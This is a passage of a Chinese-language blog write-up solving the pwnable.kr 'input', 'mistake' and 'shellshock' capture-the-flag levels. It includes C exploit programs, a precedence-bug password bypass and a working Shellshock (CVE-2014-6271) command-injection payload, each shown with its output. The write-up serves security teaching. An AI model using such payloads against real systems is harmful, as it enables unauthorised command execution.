<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[], <span class="keyword">char</span>* envp[])</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Welcome to pwnable.kr\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Let's see if you know how to give input to program\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Just give me correct inputs then you will get the flag :)\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// argv</span></span><br><span class="line">    <span class="keyword">if</span>(argc != <span class="number">100</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strcmp</span>(argv[<span class="string">'A'</span>],<span class="string">"\x00"</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strcmp</span>(argv[<span class="string">'B'</span>],<span class="string">"\x20\x0a\x0d"</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Stage 1 clear!\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// stdio</span></span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">4</span>];</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">4</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">memcmp</span>(buf, <span class="string">"\x00\x0a\x00\xff"</span>, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    read(<span class="number">2</span>, buf, <span class="number">4</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">memcmp</span>(buf, <span class="string">"\x00\x0a\x02\xff"</span>, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Stage 2 clear!\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// env</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strcmp</span>(<span class="string">"\xca\xfe\xba\xbe"</span>, getenv(<span class="string">"\xde\xad\xbe\xef"</span>))) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Stage 3 clear!\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// file</span></span><br><span class="line">    FILE* fp = fopen(<span class="string">"\x0a"</span>, <span class="string">"r"</span>);</span><br><span class="line">    <span class="keyword">if</span>(!fp) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>( fread(buf, <span class="number">4</span>, <span class="number">1</span>, fp)!=<span class="number">1</span> ) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>( <span class="built_in">memcmp</span>(buf, <span class="string">"\x00\x00\x00\x00"</span>, <span class="number">4</span>) ) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    fclose(fp);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Stage 4 clear!\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// network</span></span><br><span class="line">    <span class="keyword">int</span> sd, cd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">saddr</span>, <span class="title">caddr</span>;</span></span><br><span class="line">    sd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(sd == <span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"socket error, tell admin\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    saddr.sin_family = AF_INET;</span><br><span class="line">    saddr.sin_addr.s_addr = INADDR_ANY;</span><br><span class="line">    saddr.sin_port = htons( atoi(argv[<span class="string">'C'</span>]) );</span><br><span class="line">    <span class="keyword">if</span>(bind(sd, (struct sockaddr*)&amp;saddr, <span class="keyword">sizeof</span>(saddr)) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"bind error, use another port\n"</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    listen(sd, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">int</span> c = <span class="keyword">sizeof</span>(struct sockaddr_in);</span><br><span class="line">    cd = accept(sd, (struct sockaddr *)&amp;caddr, (<span class="keyword">socklen_t</span>*)&amp;c);</span><br><span class="line">    <span class="keyword">if</span>(cd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"accept error, tell admin\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>( recv(cd, buf, <span class="number">4</span>, <span class="number">0</span>) != <span class="number">4</span> ) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">memcmp</span>(buf, <span class="string">"\xde\xad\xbe\xef"</span>, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Stage 5 clear!\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// here's your flag</span></span><br><span class="line">    system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>程序判断了命令行参数和两个特定位的参数值，由于不可打印符的存在，所以将此题需要进行 c 编程，将需要的变量参数和环境变量通过 <code>execve()</code> 函数传递给 <code>/home/input/input</code> 程序。</p>
<p>例如针对下面这段参数判断：</p>
<pre><code>if(argc != 100) return 0;
if(strcmp(argv[&apos;A&apos;],&quot;\x00&quot;)) return 0;
if(strcmp(argv[&apos;B&apos;],&quot;\x20\x0a\x0d&quot;)) return 0;
printf(&quot;Stage 1 clear!\n&quot;);
</code></pre><p>可以使用如下程序进行 bypass：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   <span class="keyword">char</span>* argv[<span class="number">101</span>] = &#123;[<span class="number">0</span> ... <span class="number">99</span>] = <span class="string">"A"</span>&#125;;</span><br><span class="line">   argv[<span class="string">'A'</span>] = <span class="string">"\x00"</span>;</span><br><span class="line">   argv[<span class="string">'B'</span>] = <span class="string">"\x20\x0a\x0d"</span>;</span><br><span class="line">   argv[<span class="string">'C'</span>] = <span class="string">"31337"</span>;</span><br><span class="line"></span><br><span class="line">   execve(<span class="string">"/home/input/input"</span>, argv, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>将以上代码 <code>copy</code> 到服务器的 <code>/tmp</code> 目录下，然后编译运行：</p>
<pre><code>input@ubuntu:/tmp/rrr$ ./bypass_input
Welcome to pwnable.kr
Let&apos;s see if you know how to give input to program
Just give me correct inputs then you will get the flag :)
Stage 1 clear!
</code></pre><p>输入输出部分需要使用亲子进程间的通信，这里有一片文章介绍的非常详细-<a href="http://www.ibm.com/developerworks/cn/linux/l-ipc/part1/" target="_blank" rel="noopener">《Linux环境进程间通信（一）》</a>，这里就不过多阐述了。</p>
<p>环境变量直接定义 <code>char* envp[2] = {&quot;\xde\xad\xbe\xef=\xca\xfe\xba\xbe&quot;};</code> 即可通过 Stage 3。</p>
<p>文件部分直接使用如下代码，进行文件创建并将要求的字符写入即可：</p>
<pre><code>FILE* fp = fopen(&quot;\x0a&quot;, &quot;wb&quot;);
if(!fp) {
    printf(&quot;file create error!\n&quot;);
    exit(-1);
}
fwrite(&quot;\x00\x00\x00\x00&quot;, 4, 1, fp);
fclose(fp);
</code></pre><p>在 Stage 5 部分，直接利用 python 程序向预先设置好的监听端口 <code>31337</code> 发送对应字符 <code>\xde\xad\xbe\xef</code> 即可通过。</p>
<p>最终的利用程序如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* argv[<span class="number">101</span>] = &#123;[<span class="number">0</span> ... <span class="number">99</span>] = <span class="string">"A"</span>&#125;;</span><br><span class="line">    argv[<span class="string">'A'</span>] = <span class="string">"\x00"</span>;</span><br><span class="line">    argv[<span class="string">'B'</span>] = <span class="string">"\x20\x0a\x0d"</span>;</span><br><span class="line">    argv[<span class="string">'C'</span>] = <span class="string">"31337"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span>* envp[<span class="number">2</span>] = &#123;<span class="string">"\xde\xad\xbe\xef=\xca\xfe\xba\xbe"</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> pipe1[<span class="number">2</span>], pipe2[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">if</span>(pipe(pipe1) &lt; <span class="number">0</span> || pipe(pipe2) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"pipe error!\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    FILE* fp = fopen(<span class="string">"\x0a"</span>, <span class="string">"wb"</span>);</span><br><span class="line">    <span class="keyword">if</span>(!fp) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"file create error!\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    fwrite(<span class="string">"\x00\x00\x00\x00"</span>, <span class="number">4</span>, <span class="number">1</span>, fp);</span><br><span class="line">    fclose(fp);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(fork() == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// Parent processing</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Parent processing is here...\n"</span>);</span><br><span class="line">        dup2(pipe1[<span class="number">0</span>], <span class="number">0</span>);</span><br><span class="line">        close(pipe1[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">        dup2(pipe2[<span class="number">0</span>], <span class="number">2</span>);</span><br><span class="line">        close(pipe2[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">        execve(<span class="string">"/home/input/input"</span>, argv, envp);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Child processing</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Parent processing is here...\n"</span>);</span><br><span class="line">        write(pipe1[<span class="number">1</span>], <span class="string">"\x00\x0a\x00\xff"</span>, <span class="number">4</span>);</span><br><span class="line">        write(pipe2[<span class="number">1</span>], <span class="string">"\x00\x0a\x02\xff"</span>, <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">        sleep(<span class="number">30</span>); </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>将其 copy 到服务器 <code>/tmp</code> 目录下，编译运行，并将 <code>/home/input/flag</code> 文件链接到该目录下。Stage 1,2,3,4 会依次通过并在子进程中开始 <code>sleep(30)</code>，这时候另起终端使用借助 <code>python</code> 和 <code>nc</code> 直接向本地 <code>31337</code> 端口发送数据：</p>
<pre><code>python -c &quot;print &apos;\xde\xad\xbe\xef&apos;&quot; | nc 127.0.0.1 31337
</code></pre><p><img src="/images/articles/2015-07-24-toddler-s-bottle-writeup-pwnable-kr/input-1.png" alt=""></p>
<h3 id="mistake"><a href="#mistake" class="headerlink" title="[mistake]"></a>[mistake]</h3><blockquote>
<p>We all make mistakes, let’s move on.</p>
<p>(don’t take this too seriously, no fancy hacking skill is required at all)</p>
<p>This task is based on real event<br>Thanks to dhmonkey</p>
<p>hint : operator priority</p>
<p>ssh <a href="mailto:mistake@pwnable.kr" target="_blank" rel="noopener">mistake@pwnable.kr</a> -p2222 (pw:guest)</p>
</blockquote>
<p><code>mistake.c</code> 代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PW_LEN 10</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> XORKEY 1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">xor</span><span class="params">(<span class="keyword">char</span>* s, <span class="keyword">int</span> len)</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;len; i++)&#123;</span><br><span class="line">		s[i] ^= XORKEY;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span> fd;</span><br><span class="line">	<span class="keyword">if</span>(fd=open(<span class="string">"/home/mistake/password"</span>,O_RDONLY,<span class="number">0400</span>) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"can't open password %d\n"</span>, fd);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"do not bruteforce...\n"</span>);</span><br><span class="line">	sleep(time(<span class="number">0</span>)%<span class="number">20</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">char</span> pw_buf[PW_LEN+<span class="number">1</span>];</span><br><span class="line">	<span class="keyword">int</span> len;</span><br><span class="line">	<span class="keyword">if</span>(!(len=read(fd,pw_buf,PW_LEN) &gt; <span class="number">0</span>))&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"read error\n"</span>);</span><br><span class="line">		close(fd);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">char</span> pw_buf2[PW_LEN+<span class="number">1</span>];</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"input password : "</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%10s"</span>, pw_buf2);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// xor your input</span></span><br><span class="line">	xor(pw_buf2, <span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(!<span class="built_in">strncmp</span>(pw_buf, pw_buf2, PW_LEN))&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Password OK\n"</span>);</span><br><span class="line">		system(<span class="string">"/bin/cat flag\n"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Wrong Password\n"</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	close(fd);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>大致一看，发现程序流程是从 <code>password</code> 文件中读取10字节，然后让用户输入10字节，取其与1的异或值与 <code>password</code> 文件中的头10字节进行比较，若相等则返回 flag。</p>
<p>但是呢，这里有一个问题，题目中也给出了提示-“操作符运算级别”，程序在尝试打开 <code>password</code> 文件时，代码如下：</p>
<pre><code>if(fd=open(&quot;/home/mistake/password&quot;,O_RDONLY,0400) &lt; 0)
</code></pre><p>由于 小于符号<code>&lt;</code> 优先级高于 赋值号<code>=</code>，所以成功打开文件后 <code>open()</code> 函数返回值大于0，fd 最终会被赋值为 <code>0</code>，因此在下面 read(fd) 的过程中从 stdin 输入缓冲区获取 <code>password</code> 的头10字节，这样就能预先控制 <code>password</code> 的10字节，拿到 flag。</p>
<pre><code>mistake@ubuntu:~$ ./mistake
do not bruteforce...
0000000000
input password : 1111111111
Password OK
Mommy, the operator priority always confuses me :(\
</code></pre><h3 id="shellshock"><a href="#shellshock" class="headerlink" title="[shellshock]"></a>[shellshock]</h3><blockquote>
<p>Mommy, there was a shocking news about bash.<br>I bet you already know, but lets just make it sure :)</p>
<p>ssh <a href="mailto:shellshock@pwnable.kr" target="_blank" rel="noopener">shellshock@pwnable.kr</a> -p2222 (pw:guest)</p>
</blockquote>
<p>很明显该题考察 Bash 破壳漏洞 CVE-2014-6271，漏洞相关详情可参考<a href="https://access.redhat.com/articles/1200223" target="_blank" rel="noopener">这里</a>。</p>
<p>连上服务器后，路径有下面几个文件：</p>
<pre><code>shellshock@ubuntu:~$ ls -al
total 976
drwxr-x---  4 root shellshock    4096 Oct 12  2014 .
dr-xr-xr-x 58 root root          4096 Feb  5 08:35 ..
-r-xr-xr-x  1 root shellshock2 959120 Oct 12  2014 bash
d---------  2 root root          4096 Oct 12  2014 .bash_history
-r--r-----  1 root shellshock2     47 Oct 12  2014 flag
dr-xr-xr-x  2 root root          4096 Oct 12  2014 .irssi
-r-xr-sr-x  1 root shellshock2   8547 Oct 12  2014 shellshock
-rw-r-----  1 root shellshock     188 Oct 12  2014 shellshock.c
shellshock@ubuntu:~$
</code></pre><p>可以看到 <code>shellshock</code> 和 <code>flag</code> 的 GROUP 都为 <code>shellshock2</code>，而当前用户组为 <code>shellshock</code>，这里通过查看 <code>shellshock.c</code> 源码发现，可以利用 shellshock 漏洞来在 <code>shellshock</code> 程序的环境中设置好 UID 和 GID 然后去执行 <code>cat flag</code>。<code>shellshock.c</code> 源码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	setresuid(getegid(), getegid(), getegid());</span><br><span class="line">	setresgid(getegid(), getegid(), getegid());</span><br><span class="line">	system(<span class="string">"/home/shellshock/bash -c 'echo shock_me'"</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>/home/shellshock/bash</code> 经过测试存在 shellshock 漏洞：</p>
<p><img src="/images/articles/2015-07-24-toddler-s-bottle-writeup-pwnable-kr/shellshock-1.png" alt=""></p>
<p>因此直接构造 Payload：<code>env x=&#39;() { :;}; /bin/cat flag&#39; ./shellshock</code> 即可得到 flag：</p>
<pre><code>shellshock@ubuntu:~$ env x=&apos;() { :;}; /bin/cat flag&apos; ./shellshock
only if I knew CVE-2014-6271 ten years ago..!!
Segmentation fault
shellshock@ubuntu:~$
</code></pre>
  </div>
</article>



    </div>
    
      <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Archives</a></li>
         
          <li><a href="http://github.com/RickGray">Projects</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#fd"><span class="toc-number">1.</span> <span class="toc-text">[fd]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#collision"><span class="toc-number">2.</span> <span class="toc-text">[collision]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bof"><span class="toc-number">3.</span> <span class="toc-text">[bof]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flag"><span class="toc-number">4.</span> <span class="toc-text">[flag]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#passcode"><span class="toc-number">5.</span> <span class="toc-text">[passcode]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#random"><span class="toc-number">6.</span> <span class="toc-text">[random]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#input"><span class="toc-number">7.</span> <span class="toc-text">[input]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mistake"><span class="toc-number">8.</span> <span class="toc-text">[mistake]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#shellshock"><span class="toc-number">9.</span> <span class="toc-text">[shellshock]</span></a></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://rickgray.me/2015/07/24/toddler-s-bottle-writeup-pwnable-kr/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://rickgray.me/2015/07/24/toddler-s-bottle-writeup-pwnable-kr/&text=Toddler&#39;s Bottle Writeup [pwnable.kr]"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://rickgray.me/2015/07/24/toddler-s-bottle-writeup-pwnable-kr/&title=Toddler&#39;s Bottle Writeup [pwnable.kr]"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://rickgray.me/2015/07/24/toddler-s-bottle-writeup-pwnable-kr/&is_video=false&description=Toddler&#39;s Bottle Writeup [pwnable.kr]"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Toddler&#39;s Bottle Writeup [pwnable.kr]&body=Check out this article: http://rickgray.me/2015/07/24/toddler-s-bottle-writeup-pwnable-kr/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://rickgray.me/2015/07/24/toddler-s-bottle-writeup-pwnable-kr/&title=Toddler&#39;s Bottle Writeup [pwnable.kr]"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://rickgray.me/2015/07/24/toddler-s-bottle-writeup-pwnable-kr/&title=Toddler&#39;s Bottle Writeup [pwnable.kr]"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://rickgray.me/2015/07/24/toddler-s-bottle-writeup-pwnable-kr/&title=Toddler&#39;s Bottle Writeup [pwnable.kr]"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://rickgray.me/2015/07/24/toddler-s-bottle-writeup-pwnable-kr/&title=Toddler&#39;s Bottle Writeup [pwnable.kr]"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://rickgray.me/2015/07/24/toddler-s-bottle-writeup-pwnable-kr/&name=Toddler&#39;s Bottle Writeup [pwnable.kr]&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

    
    <footer id="footer">
  <div class="footer-left">
    Copyright &copy; 2018 RickGray
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Archives</a></li>
         
          <li><a href="http://github.com/RickGray">Projects</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

</body>
</html>
<!-- styles -->
<link rel="stylesheet" href="/lib/font-awesome/css/fontawesome-all.min.css">
<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">

<!-- jquery -->
<script src="/lib/jquery/jquery.min.js"></script>
<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
<script src="/js/main.js"></script>
<!-- search -->

<!-- Google Analytics -->

    <script type="text/javascript">
        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
        ga('create', 'UA-107844377-1', 'auto');
        ga('send', 'pageview');
    </script>

<!-- Baidu Analytics -->

<!-- Disqus Comments -->


